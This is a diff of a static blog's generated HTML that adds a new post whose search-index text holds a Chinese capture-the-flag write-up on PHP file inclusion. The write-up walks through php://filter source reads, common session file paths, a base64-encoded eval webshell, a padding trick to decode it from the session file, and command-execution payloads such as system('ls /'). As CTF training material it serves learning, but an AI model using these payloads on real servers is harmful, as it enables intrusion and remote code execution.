@@ -9,7 +9,7 @@
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
 <title>outlaws&#39; blog</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1616124558735">
+<link rel="shortcut icon" href="/favicon.ico?v=1616395272964">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -207,19 +207,19 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">2</span>
+        <span class="site-item-stat-count">3</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
     <div class="sidebar-item-box">
       <a href="">
-        <span class="site-item-stat-count">4</span>
+        <span class="site-item-stat-count">8</span>
         <span class="site-item-stat-name language" data-lan="category">分类</span>
       </a>
     </div>
     <div class="sidebar-item-box">
       <a href="/tags/">
-        <span class="site-item-stat-count">4</span>
+        <span class="site-item-stat-count">8</span>
         <span class="site-item-stat-name language" data-lan="tag">标签</span>
       </a>
     </div>
@@ -268,7 +268,7 @@
   <div class="archive-timeline-box">
     <div class="archive-timeline-title">
       
-        <h2 class="language" data-lan="archives" data-count="2">非常好！目前共计2篇日志，继续努力！</h2>
+        <h2 class="language" data-lan="archives" data-count="3">非常好！目前共计3篇日志，继续努力！</h2>
       
     </div>
     
@@ -278,6 +278,19 @@
           <h2 class="tag-year">2021</h2>
         </div>    
         
+      
+      <a href="https://outlaws-bai.github.io/post/LFI_session/">
+        <div class="motion-warpper tag-archive-node">
+          <div class="tag-node">
+            <h1>
+              03-22
+              <small>记一道session文件包含题目</small>
+            </h1>
+          </div>  
+      </div>
+      </a>
+    
+      
       
       <a href="https://outlaws-bai.github.io/post/xxe/">
         <div class="motion-warpper tag-archive-node">
@@ -545,6 +558,68 @@
       <hr>
     </div>
     <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/LFI_session/"" data-c="
+          &lt;h1 id=&#34;考点&#34;&gt;考点&lt;/h1&gt;
+&lt;p&gt;1.LFI(文件包含)&lt;/p&gt;
+&lt;p&gt;2.session文件包含getshell&lt;/p&gt;
+&lt;p&gt;3.base64&lt;/p&gt;
+&lt;h1 id=&#34;确认利用方式&#34;&gt;确认利用方式&lt;/h1&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616393865233.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;进入主页，找漏洞，点击test处，存在明显LFI文件包含漏洞&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616393954087.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;php伪协议base64读index.php，解码后得到&lt;/p&gt;
+&lt;p&gt;http://42.192.77.229:20012/?file=php://filter/convert.base64-encode/resource=index.php&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616393969415.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;同样继续读page.php，无敏感信息。&lt;/p&gt;
+&lt;p&gt;回头想到还有test.php，同样伪协议读取后解码得到&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616393982743.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;确认此题应是使用php-LFI session文件包含getshell&lt;/p&gt;
+&lt;h1 id=&#34;找到session存储路径&#34;&gt;找到session存储路径&lt;/h1&gt;
+&lt;p&gt;测试常见session保存路径&lt;/p&gt;
+&lt;p&gt;常见有&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+/var/lib/php5/sessions/sess_xxx
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+/var/lib/sess_PHPSESSID
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中的PHPSESSID为Cookie处&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616393997142.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;测试后得到session路径为&lt;/p&gt;
+&lt;p&gt;/var/lib/php/sessions/sess_PHPSESSID&lt;/p&gt;
+&lt;p&gt;此处即为:&lt;/p&gt;
+&lt;p&gt;/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615&lt;/p&gt;
+&lt;p&gt;读取后得到内容&lt;/p&gt;
+&lt;p&gt;user_id|s:32:&amp;quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&amp;quot;;views|i:5;&lt;/p&gt;
+&lt;p&gt;得知此处传入的user_id是使用base64存储在session中的。猜测可否使用php伪协议解码后利用，但发现解码后为乱码且无法利用。&lt;/p&gt;
+&lt;h1 id=&#34;bypass&#34;&gt;bypass&lt;/h1&gt;
+&lt;p&gt;再找思路，回顾base64，是将每3位字符编码为4位字符。最后得到的编码长度必须为4的倍数，不足处添加等号=&lt;/p&gt;
+&lt;p&gt;照着这个思路，只需保证base64(payload)前的可解码长度为4的倍数，则可以对一句话正常解码再利用。&lt;/p&gt;
+&lt;p&gt;备注：base64对不存在码表中的字符会略过。&lt;/p&gt;
+&lt;p&gt;所以base64(payload)前的user_id|s:32:&amp;quot;，base64实际解码的是userids32，长度仅为9。&lt;/p&gt;
+&lt;p&gt;备注：此处的32为len(base64(payload))&lt;/p&gt;
+&lt;p&gt;所以要利用的话s处的长度必得为5位数，才能使得base64(payload)前的可解码长度为4的倍数，进而保证base64(payload)可以被解码为payload(一句话)。此处利用python得到&#39;a&#39;*30000&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394012416.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;提交后，读取session&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394025696.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394041882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394055068.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;getflag&#34;&gt;getflag&lt;/h1&gt;
+&lt;p&gt;利用伪协议解码：&lt;/p&gt;
+&lt;p&gt;http://42.192.77.229:20012/?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615&lt;/p&gt;
+&lt;p&gt;POST：1=phpinfo();&lt;/p&gt;
+&lt;p&gt;成功利用&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394066494.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;1=system(&#39;ls /&#39;);&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394080300.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616394091568.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;flag{bf00afbd066e5bb54709b4ae6277d79f}&lt;/p&gt;
+">记一道session文件包含题目</a>
+      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/xxe/"" data-c="
